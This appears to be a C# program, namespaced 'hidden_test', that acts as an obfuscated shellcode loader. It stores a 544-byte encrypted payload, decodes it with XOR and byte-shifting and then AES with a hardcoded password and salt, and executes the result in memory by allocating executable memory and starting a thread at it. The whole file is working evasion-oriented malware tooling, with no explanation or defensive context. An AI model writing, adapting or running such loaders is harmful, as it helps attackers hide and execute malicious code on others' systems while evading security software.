using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;


namespace hidden_test
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static byte[] AESDecryptBytes(byte[] cryptBytes, byte[] passBytes, byte[] saltBytes)
        {
            byte[] clearBytes = null;

            // create a key from the password and salt, use 32K iterations
            var key = new Rfc2898DeriveBytes(passBytes, saltBytes, 32768);

            using (Aes aes = new AesManaged())
            {
                // set the key size to 256
                aes.KeySize = 256;
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cryptBytes, 0, cryptBytes.Length);
                        cs.Close();
                    }
                    clearBytes = ms.ToArray();
                }
            }
            return clearBytes;
        }

        static void Main(string[] args)
        {
            byte[] startcode = new byte[544] {
                0x62,0x01,0xab,0x05,0x64,0x86,0xb5,0x77,0x9f,0x39,0x57,0x13,0xca,0x07,0x63,
0x67,0xd9,0x03,0x6e,0x16,0x52,0xf1,0xc0,0x10,0xe2,0x4d,0xe6,0xdb,0x49,0xa2,
0xcc,0xd0,0xcc,0x50,0xa5,0x91,0x84,0xb6,0x59,0x77,0xd7,0x61,0x53,0x40,0xea,
0xb7,0xdc,0x0f,0x05,0xd7,0xce,0x48,0x49,0x32,0xd5,0x21,0x9c,0xfb,0x08,0x77,
0xe7,0xb3,0x95,0x5d,0x4b,0xd4,0x18,0x1a,0x3d,0x53,0x07,0xb6,0x39,0x2b,0x8e,
0xa0,0xbf,0xb9,0x72,0xcc,0x40,0x25,0x1f,0xa0,0x3f,0xe4,0xa8,0x63,0x00,0x5d,
0x85,0xa4,0x68,0x94,0xaa,0x54,0x56,0xfa,0x41,0x13,0xfe,0x06,0x84,0xe6,0xe9,
0x14,0x9d,0x67,0x6d,0x5f,0x9f,0xba,0xa5,0x2d,0x05,0x31,0xa5,0x9b,0x6d,0xe3,
0x26,0x65,0x07,0x4b,0xff,0x7c,0xff,0x9e,0xb4,0x11,0x11,0xff,0x02,0x99,0xab,
0x5f,0xb5,0x75,0x71,0xdb,0x59,0x57,0xeb,0xd4,0x01,0x14,0xfd,0x61,0x91,0x81,
0x3d,0xd0,0x84,0x77,0x3b,0x33,0x50,0x9e,0xb7,0x7d,0x3d,0x1b,0xe8,0x9c,0xf9,
0xd0,0x02,0x48,0xd0,0xe0,0x94,0xf0,0x1e,0xe1,0xc4,0x07,0xf8,0xc3,0x0b,0x92,
0x0c,0x86,0x04,0xea,0xbc,0x79,0x97,0xe8,0xe2,0x9d,0xcd,0xac,0xab,0x90,0xaa,
0x5a,0x2d,0xdf,0x45,0xc3,0xc7,0xc7,0x42,0xa0,0x8e,0x29,0xa9,0xff,0x11,0x3d,
0x51,0x8e,0x53,0xe6,0xa3,0x67,0xfd,0x51,0xee,0x70,0xc3,0xff,0x48,0x94,0x76,
0xf0,0x7d,0x52,0x81,0x07,0x6c,0x55,0x9c,0x10,0xfc,0xf3,0x29,0x11,0x04,0x88,
0xcb,0x07,0xdb,0x8b,0xe7,0x6a,0x3d,0x8d,0x47,0xd7,0x0a,0xa5,0xf7,0xe3,0x76,
0x03,0x2e,0x93,0xcc,0x18,0xe3,0x41,0xff,0x1f,0x62,0x49,0x5a,0x1f,0x63,0x82,
0xe5,0x8e,0xa2,0x75,0xbf,0xa9,0xb0,0x50,0x35,0xb2,0x90,0x16,0x39,0xb1,0xaf,
0x21,0xdf,0xa0,0xe6,0x96,0x84,0x0e,0x7a,0x7a,0xe9,0x79,0xce,0xd9,0xd1,0x7b,
0x99,0x7d,0x9c,0x0e,0xa1,0xe7,0xe1,0x62,0x93,0xc2,0x99,0xf9,0x03,0x01,0xc3,
0x6a,0x44,0x7a,0x77,0x1c,0x8a,0x5f,0xe3,0x40,0x5d,0xb3,0x74,0x24,0xf4,0x59,
0x5b,0x27,0x42,0x61,0x75,0xff,0x17,0x1a,0x80,0x2f,0x69,0x57,0x31,0xde,0x04,
0xae,0x66,0xee,0xe5,0x3c,0xed,0xbd,0xb7,0x44,0xbc,0x08,0x35,0xea,0x6b,0x76,
0x5f,0x3d,0xb4,0x9f,0x1f,0xe6,0xb1,0x8d,0x76,0x40,0xf4,0x55,0x91,0x5b,0x16,
0x98,0x98,0x7e,0xe9,0x30,0x21,0xdd,0x60,0x0f,0xa7,0xb6,0x4a,0xf3,0x9e,0x94,
0x74,0x1b,0x01,0x39,0x41,0x50,0x53,0xc3,0x16,0x92,0x64,0x7c,0xa0,0x45,0x7c,
0x9b,0x04,0x70,0x93,0x8b,0x40,0x3c,0x87,0xd4,0xde,0x16,0x72,0x84,0x31,0x49,
0x49,0x13,0x05,0x08,0x07,0x1f,0xa2,0x3c,0xb3,0x2e,0x68,0xa3,0x8d,0x64,0x40,
0x31,0x4d,0x77,0x21,0x91,0xec,0xcf,0xdd,0x84,0x0d,0x56,0x73,0x76,0x88,0x85,
0x8a,0xba,0x92,0x44,0xa1,0xc1,0x7f,0xcf,0x3e,0xb1,0x24,0x96,0x6e,0x6b,0x32,
0x03,0xaf,0x70,0x00,0xcf,0xd7,0xb6,0xce,0x8b,0xb1,0xb4,0x09,0x4e,0x7f,0x79,
0xc6,0x48,0xe5,0xf6,0x55,0x51,0x4f,0xd7,0x88,0xd4,0xa8,0x3f,0x30,0x21,0xe9,
0xf8,0x2f,0x27,0x6a,0x97,0xba,0x72,0x3e,0xad,0x5c,0xe4,0x71,0xf3,0x01,0xfd,
0xeb,0xb2,0xc3,0xf7,0x6b,0xd3,0xa3,0xb2,0xb9,0x25,0xc7,0xb8,0x5e,0x9f,0x1f,
0xc6,0x0a,0x4a,0x36,0x4c,0x11,0xcc,0xc2,0xe5,0x60,0xea,0xb3,0x81,0x44,0xd4,
0x9f,0x78,0x47,0x13,};

            //XOR
            Int32 key = 93252512;
            for (int i = 0; i < startcode.Length; i++)
            {
                startcode[i] = (byte)(((uint)startcode[i] ^ (key + i)) & 0xFF);
            }


            for (int i = 0; i < startcode.Length; i++)
            {
                startcode[i] = (byte)(((uint)startcode[i] - (i & 0xFF)) & 0xFF);
            }


            byte[] passBytes = Encoding.UTF8.GetBytes("This is the pass");
            byte[] saltBytes = Encoding.UTF8.GetBytes("This is the salt");
            byte[] result = AESDecryptBytes(startcode, passBytes, saltBytes);

            int size = result.Length;
            //Console.WriteLine("DEBUG:: " + size);
            //DEBUG
            //StringBuilder hex = new StringBuilder(result.Length * 2);
            //var each_line = 15;
            //var total_length = 0;

            //foreach (byte b in result)
            //{
            //    hex.AppendFormat("0x{0:x2},", b);
            //    each_line = each_line - 1;
            //    total_length = total_length + 1;
            //    if (each_line == 0)
            //    {
            //        hex.Append("\n");
            //        each_line = 15;
            //    }

            //}

            //Console.WriteLine("The payload (" + total_length + ") is:\n" + hex.ToString());



            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(result, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}


